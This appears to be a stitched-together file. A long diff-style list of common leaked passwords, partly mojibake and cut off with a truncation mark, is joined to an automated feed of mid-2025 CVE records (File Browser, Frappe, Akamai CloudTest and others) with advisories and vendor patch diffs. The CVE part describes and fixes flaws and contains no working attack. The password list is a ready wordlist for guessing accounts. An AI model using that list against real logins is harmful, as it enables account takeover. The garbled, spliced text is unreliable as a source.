+hailey1
+smile123
+224466
+1983
+7777777777
+4321
+tripper
+yomama1
+red
+fireman
+renata
+billabong
+777888
+annette
+bernie
+ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½ï¿½
+blossom
+chase1
+williams1
+football10
+lakshmi
+joe123
+makaveli
+456321
+almond
+ninja1
+sugar
+panda
+sigma
+love24
+burton
+google123
+clifford
+pepito
+daddysgirl
+morena
+stormy
+1357924680
+cartman
+kristine
+nikola
+washington
+freckles
+bishop
+trigger
+1q2w3e4r5
+hendrix
+password23
+tristan1
+cracker
+detroit
+beatriz
+lilwayne
+oblivion
+giovanna
+spike
+gizmo
+germany1
+fortuna
+paul
+kayla
+callum
+maverick1
+parker1
+soccer4
+bscirc
+alfredo
+lisa
+bettyboop1
+divine
+sister1
+coupons
+megaman
+353535
+poison
+broken1
+myspace.co
+juggalo1
+star12
+blah
+blue13
+blowme
+060606
+markus
+jeter2
+coming
+starfish
+Welcome1
+toronto
+sandrine
+amigos
+ronnie1
+telephone
+jordan12
+thankyou
+renee1
+stardust
+chubby
+billybob
+258369
+armando
+skywalker
+rebel1
+freddy1
+snowman1
+babies
+lindsay1
+montreal
+herman
+jesse
+777
+hotboy1
+jester
+ncc1701d
+football7
+alladin79
+mierda
+k12345
+heyhey1
+random1
+1977
+peugeot
+monkey3
+333666
+cassidy
+mandy1
+therock1
+myspace7
+albert1
+arianna
+casey
+max
+savage
+just4fun
+mate1
+20082008
+hernandez
+spiderman3
+horse1
+marianne
+apollo13
+paintball
+katherine1
+789987
+azerty1
+fucklove1
+godbless
+mobile
+baseball3
+robinson
+munchkin
+hayley
+000000a
+eeyore
+1asshole
+ronaldo9
+punkrock
+icehouse
+skeeter
+sharp
+serenity1
+brownie1
+everton1
+chemistry
+joejoe
+292929
+gothic
+paris
+warcraft3
+ireland1
+sergei
+missy
+bubblegum1
+hotstuff1
+mykids
+claudia1
+gators1
+1981
+hookem
+jrcfyf
+12345qwe
+griffin
+kaktus
+dietcoke
+asdfg123
+bitch69
+cashmoney
+cashmoney1
+steaua
+brazil
+1236987
+jack123
+ilove1
+snuggles
+snowflake
+martini
+entropy
+bubblegum
+1q2w3e4r5t6y7u8i9o0p
+piazza
+deftones
+longhorns1
+123456789o
+aobo2010
+redrum
+kaylee
+nicole12
+damilola
+christy
+aol123
+marlboro1
+loveme123
+callofduty
+michaela
+pegasus
+bluemoon
+tony
+flipper
+sheena
+omg123
+spanky1
+marshall1
+Michael
+eric
+192837
+catfish
+bruno
+superman12
+please1
+jerry1
+juliette
+521521
+garfield1
+ILOVEYOU
+artist
+something1
+birdie
+mouse1
+carson
+blueberry
+warriors
+tyson1
+1122
+PolniyPizdec110211
+12345abc
+september2
+millie1
+speedy1
+cheater1
+sexxxy
+wicked
+claudio
+cracker1
+mackenzie
+19761976
+unknown
+sanjay
+michal
+trevor1
+janine
+lancer
+great1
+brandi
+5xfgs3Ii9D
+stefania
+sommer
+arizona1
+paddle
+love18
+superman2
+1978
+y6p67FtrqJ
+timmy1
+hanuman
+universal
+monkey13
+hammer1
+jojo
+lighthouse
+password6
+rock
+coco
+marcelo
+656565
+pop123
+rosebud1
+angelito
+dalton
+testpass
+rocky123
+winner1
+kingston
+bozo
+esperanza
+roscoe
+cat
+andre
+singapore
+scrappy1
+skyhawk
+rjntyjr
+rayray1
+doodle
+rocknroll
+magdalena
+jordan123
+boxcar
+rajesh
+cougar
+thumper1
+slayer666
+braves
+yolanda
+1234qwe
+fake123
+enrique
+n123456
+service
+rrrrrr
+cubs
+allah1
+helpme1
+love07
+black123
+flamingo
+tester1
+pinky
+linkedin1
+rastaman
+extreme
+dkflbvbh
+blizzard
+baseball11
+1qwert
+antonia
+soulmate
+112211
+sharon1
+qwertyqwerty
+skate4life
+1babygirl
+incubus
+office
+point
+marisa
+gjkbyf
+ramona
+*****
+alexia
+butthead1
+kolobok
+fellow
+bastard
+raquel
+buffy1
+derrick
+jeanne
+nuttertools
+blackcat
+cynthia1
+iforgot
+369258
+19731973
+momdad
+yomama
+mememe1
+my2kids
+godfather
+zxzxzx
+elvis
+mamita
+1990
+sexy14
+banane
+maximus1
+123456789123
+ironmaiden
+1991
+geheim
+lkjhgfdsa
+mister
+fatcat
+semperfi
+qwerty2
+coolio
+mommy2
+angel7
+sassy
+elodie
+richie
+mendoza
+3
+pastor
+tasha1
+lane
+revolution
+fisher
+santana
+whitney1
+as123456
+indigo
+purple12
+ilovehim
+account
+angie1
+rascal1
+leslie1
+225588
+colombia1
+poppy1
+soccer15
+raptor
+maria123
+wicked1
+jay123
+cccccc
+hilary
+fiesta
+baseball10
+maxine
+t
+1a2s3d4f
+felicia
+toyota1
+ilove
+111aaa
+amour
+motherlode
+12qwas
+1monkey
+clover
+debbie1
+shopping1
+nks230kjs82
+galatasaray
+123456as
+milan
+just4me
+dreamer1
+sexybitch
+golf
+kaitlyn
+camero1
+priyanka
+tyler123
+fashion1
+tootsie
+powers
+rfnthbyf
+praise
+target
+ricardo1
+rayray
+c12345
+babygirl13
+112233445566
+ashley12
+biscuit
+princess10
+evolution
+pwd1234
+romain
+trooper
+webhompass
+blonde
+23232323
+preston1
+lightning
+bianca1
+rbhbkk
+felix
+SKIFFY
+alejandra1
+ivanov
+westham
+sports1
+wildcats1
+princesse
+lollol1
+olamide
+585858
+alexandru
+tttttt
+champion1
+yugioh
+research
+12345c
+88888
+cutie123
+pokemon12
+number2
+nichole1
+lilly1
+animal1
+ashley123
+animals
+johnjohn
+labrador
+g-unit
+nathaniel
+paulina
+dingdong
+12345g
+smallville
+lavender
+annie
+boricua1
+jakarta
+12345l
+imissyou
+19771977
+hitler
+sonic1
+vagina1
+love12345
+susana
+gladiator
+january1
+rodney
+russell1
+qqqqqqqq
+sweetness
+moose1
+handball
+quentin
+scruffy
+jojo123
+1976
+playstation
+mauricio
+gemini1
+marijuana
+justinbieber
+lovelove1
+twister
+anamaria
+daniel12
+moloko
+19971997
+zk.
+classof09
+ibanez
+techno
+my2boys
+redred
+simpsons1
+ariana
+chipper
+sammie1
+ingrid
+azsxdc
+eastside1
+family4
+monkey22
+sherry
+12345678q
+windows1
+suckit1
+alessio
+hobbit
+bananas1
+dave
+papamama
+suzanne
+987654321a
+danilo
+aragorn
+warhammer
+casino
+hottie101
+kaitlyn1
+naughty
+nick123
+derrick1
+trinidad
+123love
+joker
+25252525
+baseball5
+daddy123
+unreal
+henry
+xxxxxx1
+oceane
+laurent
+carebear
+anthony2
+dusty1
+12345671
+pinkfloyd
+raphael
+nicole123
+jason123
+reggie1
+pizza123
+zxcasdqwe
+bigred1
+esmeralda
+street
+stewart
+1975
+monday1
+pickle1
+immortal
+000000000
+iceman1
+andy
+truelove1
+allen1
+panzer
+gabriella
+hehehe
+atlantis
+beatles1
+gibson1
+larry1
+spartan
+katana
+123456v
+shane
+girls
+power123
+zeppelin
+vincenzo
+julia1
+vaffanculo
+metal666
+surfing
+happy2
+369852
+mission
+qwe123456
+hornet
+jerry
+football11
+darwin
+virgin
+asddsa
+cadillac
+corvette1
+mary
+diana1
+garrett1
+123456789987654321
+loveless
+scrappy
+applepie
+aurelie
+radiohead
+heyhey
+zxcvbn1
+snowboard
+123456qw
+counter
+brown1
+frederic
+private1
+babycakes1
+insane
+rodriguez
+stinky1
+believe
+19741974
+larissa
+1234abc
+godisgreat
+inlove
+youtube
+1Fr2rfq7xL
+julie1
+puppies1
+sexy01
+hayden1
+diablo2
+111213
+scarlet
+logan
+aaaa1111
+soccer22
+6666666
+MaprCheM56458
+baller23
+424242
+wedding
+cheryl
+kittykat
+michael123
+sophia1
+randy1
+teresa1
+nintendo1
+valerie1
+wonder
+sublime1
+arturo
+coolman
+weed
+bowling
+gabriele
+eleven11
+harris
+monitor
+watson
+asshole2
+esteban
+qqqqqq1
+robbie1
+lolo
+logitech1
+flying
+hallo1
+pepsi
+sherlock
+iloveyou13
+pineapple1
+1992
+fuck12
+skate
+iloveyou22
+smith
+roman
+qweasdzxc123
+vfhecz
+clement
+pamela1
+marianna
+fireman1
+autumn1
+jajaja
+baby11
+money6
+man
+hannah123
+caitlin1
+granny
+zxcvbnm,./
+kenshin
+qwertyuio
+cindy
+rough
+w1985a
+peter123
+australia1
+gorgeous
+what
+pasaway
+dthjybrf
+clayton
+angelica1
+mathew
+justin123
+fuckyou3
+787898
+nascar1
+pancho
+anderson1
+denis
+r
+sandman
+888999
+Unknown
+sampson
+emma
+poopy
+blake1
+chrissy
+verbatim
+phantom1
+wildcat
+tdutybq
+nugget
+w1980a
+trisha
+jakjak
+breanna1
+myspace11
+frosty
+asterix
+2468
+cindy1
+alibaba
+monkey5
+skorpion
+maureen
+motherfucker
+jumpman23
+apache
+chico1
+kickass
+graham
+wwe123
+vfrcbvrf
+sprite
+babyko
+riccardo
+asdf3423
+123456789123456789
+paige1
+homer1
+andre1
+gagged
+rockon1
+drowssap1
+coyote
+ernesto
+colleen
+jose123
+sunshine2
+808080
+pornstar
+qwerty6
+purple123
+lasvegas1
+habibi
+nana
+fuckyou.
+brendan
+empire
+marlene
+enter
+5532361cnjqrf
+123456789b
+fernando1
+sarah123
+w1979a
+sooners1
+love17
+rusty
+voyager
+madman
+iloveyou14
+258963
+romance
+heart
+smudge
+college1
+cotton
+1974
+password21
+horse
+wolfgang
+armani
+detroit1
+irish1
+nevermind
+secret666
+football9
+23456789
+collins
+a801016
+miamor
+ghetto1
+angelina1
+vfksirf
+dixie1
+inferno
+juliet
+highheel
+chrisbrown
+z1x2c3
+w1990a
+123567
+theking
+bethany1
+a23456
+kelvin
+bowwow
+fire
+abhishek
+1a1a1a
+norton
+ultimate
+jersey
+retard1
+bryan1
+tester
+fighter
+backspace
+osiris
+987987
+zaqxsw
+disturbed1
+francis1
+kaiser
+f00tball
+control
+1a2b3c4d5e
+carebear1
+gbpltw
+spiderman2
+free
+robin
+mitchell1
+polaris
+katrina1
+iloveyou4
+ericsson
+gonzalez
+bigman
+134679852
+sexyboy1
+airforce
+awful
+campbell
+chevrolet
+babyface
+jojojo
+aleksandra
+haley1
+1598753
+w1989a
+jungle
+cookie12
+soccer17
+car
+deepak
+hawaii50
+xyz123
+romashka
+jillian
+mermaid
+cassidy1
+qwertyuiop[]
+ninja
+donald1
+whore1
+irina
+jellybean1
+ghost1
+boobs
+carole
+24682468
+devils
+200000
+francois
+football3
+hakr
+123456ab
+halloween
+axio
+morrison
+blaze1
+cactus
+global
+motocross
+111000
+abraham
+chevelle
+sarita
+fucklove
+h123456
+skolko
+iloveyou11
+princess13
+1020304050
+unicorn1
+vladik
+hunting1
+kenny
+blue1234
+buttons1
+lucas1
+415263
+162534
+princess11
+soccer8
+pyon
+soldier
+sandiego
+halo123
+southpark
+sentnece
+1973
+erika
+america10
+schatz
+london12
+anjali
+aditya
+emilia
+laurence
+daisy123
+1million
+moreno
+ash123
+kissmyass1
+phone
+austin316
+prayer
+elvira
+q123456789
+nature
+bryan
+universe
+aztnm
+hola123
+1969
+master12
+diego
+doggie1
+h
+pk3x7w9W
+romeo
+starlight
+toulouse
+richmond
+86
+desire
+cinnamon
+holiday1
+allstar
+mexico13
+punkin
+puppy
+hunting
+isaiah1
+airborne
+w1982a
+charlie2
+w1984a
+viper1
+steph1
+raven
+patience
+university
+147741
+nokia1
+1993
+keyboard
+mastermind
+jonas1
+kucing
+kramer
+delpiero
+lestat
+unique
+farmer
+phillip1
+action
+adriana1
+qwe321
+noodles
+britney1
+abcdefghij
+carina
+xxxxx
+crazy123
+boogie1
+window
+2cool4u
+renault
+hawaii1
+passwort1
+hamster1
+rocker1
+merlin1
+jesusislord
+33333
+sayangku
+castle
+football5
+d71lWz9zjS
+virginia1
+rocket1
+ganteng
+emanuel
+thegame1
+flower123
+angel01
+lennon
+house1
+purple2
+baxter1
+timber
+cuddles1
+xxxxxxxx
+letmein2
+ktyjxrf
+yankee1
+joey
+25251325
+w1986a
+justin12
+14344
+sabine
+my
+jesus12
+cheese123
+whynot
+1angel
+jefferson
+nnnnnn
+iloveyou5
+meghan
+aliali
+stars
+sexylady
+12345678900
+eleonora
+iloveyou123
+fucku
+jeremiah1
+nichole
+r2d2c3po
+qazwsxedc123
+mamamama
+malcolm
+kiki
+franklin1
+w1988a
+xxxx
+raider
+sucker
+kathryn
+malina
+backend
+lover12
+angel11
+sexy15
+bobcat
+UvGX8f8232
+1994
+a1a2a3a4
+emilio
+7
+iamthebest
+jessica123
+1314521
+makayla1
+slimshady
+ghetto
+nellie
+reaper
+stephane
+tomato
+bruno1
+faggot1
+794613
+amorcito
+aspire
+cheche
+treasure
+family6
+cannabis
+house
+babygirl10
+calvin1
+sirius
+wordpass1
+titans
+Ñ
+rockyou
+assass
+sandeep
+maestro
+metal1
+salman
+walter1
+123ewq
+vodafone
+pirates
+alisha
+mushroom
+love33
+jesucristo
+rebelde
+ï¿½ï¿½
+stuart
+deedee1
+w1983a
+Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…Ð¿Ñ—Ð…
+deniska
+babyblue1
+mouse
+taekwondo
+amelie
+kotenok
+cheval
+messi10
+naughty1
+billabong1
+peanuts
+9
+hottie12
+kennedy1
+webster
+lonely1
+giants1
+hannah12
+philippe
+345678
+malika
+goldfish1
+chantal
+natalya
+president
+firefly
+baseball13
+charity
+1000000
+amazing
+168168
+netlog
+w1975a
+southside
+james007
+A123456
+scruffy1
+deathnote
+skate123
+princess3
+catcat
+maurice1
+chrissy1
+nokia6300
+princess7
+lucy
+hottie123
+faithful
+556677
+kingkong1
+theking1
+suckme
+nicolas1
+helene
+lawyer
+agnieszka
+history
+12345678901
+lillian
+w1987a
+qqqqq1
+mississippi
+1995
+love123456
+united1
+vietnam
+marvin1
+dudley
+kristin1
+opensesame
+mexican
+1andonly
+rebelde1
+jake123
+19721972
+guadalupe
+blackie1
+captain1
+123
... [truncated]

================================================================================


CVE ID: CVE-2025-52995
Published: 2025-06-30T20:15:25.540
Modified: 2025-07-10T14:21:24.483
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. Prior to version 2.33.10, the implementation of the allowlist is erroneous, allowing a user to execute more shell commands than they are authorized for. The concrete impact of this vulnerability depends on the commands configured, and the binaries installed on the server or in the container image. Due to the missing separation of scopes on the OS-level, this could give an attacker access to all files managed the application, including the File Browser database. This issue has been patched in version 2.33.10.

References (3):
  1. https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108 [Patch]
  2. https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10 [Release Notes]
  3. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8 [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108 ---
From 4d830f707fc4314741fd431e70c2ce50cd5a3108 Mon Sep 17 00:00:00 2001
From: Henrique Dias <mail@hacdias.com>
Date: Thu, 26 Jun 2025 21:09:16 +0200
Subject: [PATCH] fix: correctly check if command is allowed when using shell

---
 http/commands.go | 14 ++++++++++++--
 runner/parser.go | 25 ++++++++-----------------
 runner/runner.go |  2 +-
 users/users.go   | 10 ----------
 4 files changed, 21 insertions(+), 30 deletions(-)

diff --git a/http/commands.go b/http/commands.go
index 55075db4c3..1da1f75c22 100644
--- a/http/commands.go
+++ b/http/commands.go
@@ -6,6 +6,7 @@ import (
 	"log"
 	"net/http"
 	"os/exec"
+	"slices"
 	"strings"
 	"time"
 
@@ -60,7 +61,16 @@ var commandsHandler = withUser(func(w http.ResponseWriter, r *http.Request, d *d
 		}
 	}
 
-	command, err := runner.ParseCommand(d.settings, raw)
+	// Fail fast
+	if !d.server.EnableExec || !d.user.Perm.Execute {
+		if err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { //nolint:govet
+			wsErr(conn, r, http.StatusInternalServerError, err)
+		}
+
+		return 0, nil
+	}
+
+	command, name, err := runner.ParseCommand(d.settings, raw)
 	if err != nil {
 		if err := conn.WriteMessage(websocket.TextMessage, []byte(err.Error())); err != nil { //nolint:govet
 			wsErr(conn, r, http.StatusInternalServerError, err)
@@ -68,7 +78,7 @@ var commandsHandler = withUser(func(w http.ResponseWriter, r *http.Request, d *d
 		return 0, nil
 	}
 
-	if !d.server.EnableExec || !d.user.CanExecute(command[0]) {
+	if !slices.Contains(d.user.Commands, name) {
 		if err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { //nolint:govet
 			wsErr(conn, r, http.StatusInternalServerError, err)
 		}
diff --git a/runner/parser.go b/runner/parser.go
index 8c7c13a241..5433684706 100644
--- a/runner/parser.go
+++ b/runner/parser.go
@@ -1,33 +1,24 @@
 package runner
 
 import (
-	"os/exec"
-
 	"github.com/filebrowser/filebrowser/v2/settings"
 )
 
 // ParseCommand parses the command taking in account if the current
 // instance uses a shell to run the commands or just calls the binary
 // directly.
-func ParseCommand(s *settings.Settings, raw string) ([]string, error) {
-	var command []string
+func ParseCommand(s *settings.Settings, raw string) (command []string, name string, err error) {
+	name, args, err := SplitCommandAndArgs(raw)
+	if err != nil {
+		return
+	}
 
 	if len(s.Shell) == 0 || s.Shell[0] == "" {
-		cmd, args, err := SplitCommandAndArgs(raw)
-		if err != nil {
-			return nil, err
-		}
-
-		_, err = exec.LookPath(cmd)
-		if err != nil {
-			return nil, err
-		}
-
-		command = append(command, cmd)
+		command = append(command, name)
 		command = append(command, args...)
 	} else {
-		command = append(s.Shell, raw) //nolint:gocritic
+		command = append(s.Shell, raw)
 	}
 
-	return command, nil
+	return command, name, nil
 }
diff --git a/runner/runner.go b/runner/runner.go
index 2dbafa5cd1..00e7c16af9 100644
--- a/runner/runner.go
+++ b/runner/runner.go
@@ -60,7 +60,7 @@ func (r *Runner) exec(raw, evt, path, dst string, user *users.User) error {
 		raw = strings.TrimSpace(strings.TrimSuffix(raw, "&"))
 	}
 
-	command, err := ParseCommand(r.Settings, raw)
+	command, _, err := ParseCommand(r.Settings, raw)
 	if err != nil {
 		return err
 	}
diff --git a/users/users.go b/users/users.go
index 01eb294cc3..e0310f2126 100644
--- a/users/users.go
+++ b/users/users.go
@@ -2,7 +2,6 @@ package users
 
 import (
 	"path/filepath"
-	"slices"
 
 	"github.com/spf13/afero"
 
@@ -104,12 +103,3 @@ func (u *User) Clean(baseScope string, fields ...string) error {
 func (u *User) FullPath(path string) string {
 	return afero.FullBaseFsPath(u.Fs.(*afero.BasePathFs), path)
 }
-
-// CanExecute checks if an user can execute a specific command.
-func (u *User) CanExecute(command string) bool {
-	if !u.Perm.Execute {
-		return false
-	}
-
-	return slices.Contains(u.Commands, command)
-}


================================================================================


CVE ID: CVE-2025-52901
Published: 2025-06-30T20:15:25.390
Modified: 2025-08-04T18:15:35.040
CVSS Score: 4.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-598: CWE-598

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. Prior to version 2.33.9, access tokens are used as GET parameters. The JSON Web Token (JWT) which is used as a session identifier will get leaked to anyone having access to the URLs accessed by the user. This will give an attacker full access to a user's account and, in consequence, to all sensitive files the user has access to. This issue has been patched in version 2.33.9.

References (4):
  1. https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2 [Patch]
  2. https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9 [Release Notes]
  3. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x [Exploit, Vendor Advisory]
  4. https://github.com/sbaresearch/advisories/tree/public/2025/SBA-ADV-20250327-03_Filebrowser_Sensitive_Data_Transferred_In_URL

Attempting to extract code examples from references...

--- Code from https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2 ---
From d5b39a14fd3fc0d1c364116b41289484df7c27b2 Mon Sep 17 00:00:00 2001
From: Henrique Dias <mail@hacdias.com>
Date: Thu, 26 Jun 2025 15:01:46 +0200
Subject: [PATCH] fix: remove auth token from /api/command

---
 frontend/src/api/commands.ts | 6 +++---
 1 file changed, 3 insertions(+), 3 deletions(-)

diff --git a/frontend/src/api/commands.ts b/frontend/src/api/commands.ts
index 417494704e..d29ac1cb07 100644
--- a/frontend/src/api/commands.ts
+++ b/frontend/src/api/commands.ts
@@ -1,6 +1,6 @@
-import { removePrefix } from "./utils";
-import { baseURL } from "@/utils/constants";
 import { useAuthStore } from "@/stores/auth";
+import { baseURL } from "@/utils/constants";
+import { removePrefix } from "./utils";
 
 const ssl = window.location.protocol === "https:";
 const protocol = ssl ? "wss:" : "ws:";
@@ -14,7 +14,7 @@ export default function command(
   const authStore = useAuthStore();
 
   url = removePrefix(url);
-  url = `${protocol}//${window.location.host}${baseURL}/api/command${url}?auth=${authStore.jwt}`;
+  url = `${protocol}//${window.location.host}${baseURL}/api/command${url}`;
 
   const conn = new window.WebSocket(url);
   conn.onopen = () => conn.send(command);


================================================================================


CVE ID: CVE-2025-49493
Published: 2025-06-30T20:15:25.060
Modified: 2025-09-24T19:15:31.383
CVSS Score: 5.8 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-611: Improper Restriction of XML External Entity Reference

Description:
Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.

References (3):
  1. https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes/
  2. https://www.akamai.com/products/cloudtest
  3. https://github.com/SystemVll/CVE-2025-49493

Attempting to extract code examples from references...

--- Code from https://github.com/SystemVll/CVE-2025-49493 ---
/concerto/services/RepositoryService

pip install -r requirements.txt

pip install requests urllib3 colored pyfiglet

================================================================================


CVE ID: CVE-2025-6925
Published: 2025-06-30T18:15:26.617
Modified: 2025-09-16T13:46:47.007
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability has been found in Dromara RuoYi-Vue-Plus 5.4.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /src/main/java/org/dromara/demo/controller/MailController.java of the component Mail Handler. The manipulation of the argument filePath leads to path traversal. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (7):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250620-01/report.md [Exploit, Third Party Advisory]
  2. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250620-01/report.md#steps-to-reproduce [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314437 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314437 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.600948 [Third Party Advisory, VDB Entry]
  6. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250620-01/report.md [Exploit, Third Party Advisory]
  7. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250620-01/report.md#steps-to-reproduce [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314437 ---
filePath

================================================================================


CVE ID: CVE-2025-6917
Published: 2025-06-30T18:15:26.380
Modified: 2025-07-07T14:42:17.613
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Online Hotel Booking 1.0 and classified as critical. This vulnerability affects unknown code of the file /admin/registration.php. The manipulation of the argument uname leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/MaxedFF/cve/issues/4 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314410 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314410 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.606285 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314410 ---
uname

================================================================================


CVE ID: CVE-2025-52898
Published: 2025-06-30T18:15:25.773
Modified: 2025-07-08T14:43:50.023
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Description:
Frappe is a full-stack web application framework. Prior to versions 14.94.3 and 15.58.0, a carefully crafted request could lead to a malicious actor getting access to a user's password reset token. This can only be exploited on self hosted instances configured in a certain way. Frappe Cloud users are safe. This issue has been patched in versions 14.94.3 and 15.58.0. Workarounds for this issue involve verifying password reset URLs before clicking on them or upgrading for self hosted users.

References (4):
  1. https://github.com/frappe/frappe/commit/52e31337a6c964189c8b883a2f7bc3a28ab374f2 [Patch]
  2. https://github.com/frappe/frappe/commit/5b4849b1ab5fd796b306312745b4e202b0e90d66 [Patch]
  3. https://github.com/frappe/frappe/pull/31522 [Issue Tracking]
  4. https://github.com/frappe/frappe/security/advisories/GHSA-p284-r7rh-wq7j [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/frappe/frappe/commit/52e31337a6c964189c8b883a2f7bc3a28ab374f2 ---
From 52e31337a6c964189c8b883a2f7bc3a28ab374f2 Mon Sep 17 00:00:00 2001
From: "mergify[bot]" <37929162+mergify[bot]@users.noreply.github.com>
Date: Tue, 11 Mar 2025 15:10:15 +0530
Subject: [PATCH] fix(get_url): allow disabling host header override (backport
 #31522) (#31574)

* fix(get_url): allow disabling host header override

Signed-off-by: Akhil Narang <me@akhilnarang.dev>
(cherry picked from commit 627b8e04f500c762eb4160c9faa481e681184787)

# Conflicts:
#	frappe/utils/data.py

* chore: resolve conflicts

---------

Co-authored-by: Akhil Narang <me@akhilnarang.dev>
---
 frappe/core/doctype/user/user.py |  2 +-
 frappe/utils/data.py             | 10 +++++++---
 2 files changed, 8 insertions(+), 4 deletions(-)

diff --git a/frappe/core/doctype/user/user.py b/frappe/core/doctype/user/user.py
index fbf882cd0f1e..36295501c3a6 100644
--- a/frappe/core/doctype/user/user.py
+++ b/frappe/core/doctype/user/user.py
@@ -385,7 +385,7 @@ def reset_password(self, send_email=False, password_expired=False):
 		if password_expired:
 			url = "/update-password?key=" + key + "&password_expired=true"
 
-		link = get_url(url)
+		link = get_url(url, allow_header_override=False)
 		if send_email:
 			self.password_reset_mail(link)
 
diff --git a/frappe/utils/data.py b/frappe/utils/data.py
index 8d38b92ad3ef..0e88aced0e83 100644
--- a/frappe/utils/data.py
+++ b/frappe/utils/data.py
@@ -1591,8 +1591,12 @@ def filter_strip_join(some_list: list[str], sep: str) -> list[str]:
 	return (cstr(sep)).join(cstr(a).strip() for a in filter(None, some_list))
 
 
-def get_url(uri: str | None = None, full_address: bool = False) -> str:
-	"""get app url from request"""
+def get_url(
+	uri: str | None = None,
+	full_address: bool = False,
+	allow_header_override: bool = True,
+) -> str:
+	"""Get app url from request."""
 	host_name = frappe.local.conf.host_name or frappe.local.conf.hostname
 
 	if uri and (uri.startswith("http://") or uri.startswith("https://")):
@@ -1601,7 +1605,7 @@ def get_url(uri: str | None = None, full_address: bool = False) -> str:
 	if not host_name:
 		request_host_name = get_host_name_from_request()
 
-		if request_host_name:
+		if request_host_name and allow_header_override:
 			host_name = request_host_name
 
 		elif frappe.local.site:


================================================================================


CVE ID: CVE-2025-6916
Published: 2025-06-30T17:15:34.593
Modified: 2025-07-07T14:41:39.973
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-287: Improper Authentication
  - CWE-306: Missing Authentication for Critical Function

Description:
A vulnerability, which was classified as critical, was found in TOTOLINK T6 4.1.5cu.748_B20211015. This affects the function Form_Login of the file /formLoginAuth.htm. The manipulation of the argument authCode/goURL leads to missing authentication. The attack needs to be initiated within the local network. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/c0nyy/IoT_vuln/blob/main/TOTOLINK%20T6%20Vuln.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314409 [Permissions Required, Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?id.314409 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605101 [Third Party Advisory, VDB Entry]
  5. https://www.totolink.net/ [Product]
  6. https://github.com/c0nyy/IoT_vuln/blob/main/TOTOLINK%20T6%20Vuln.md [Exploit, Third Party Advisory]

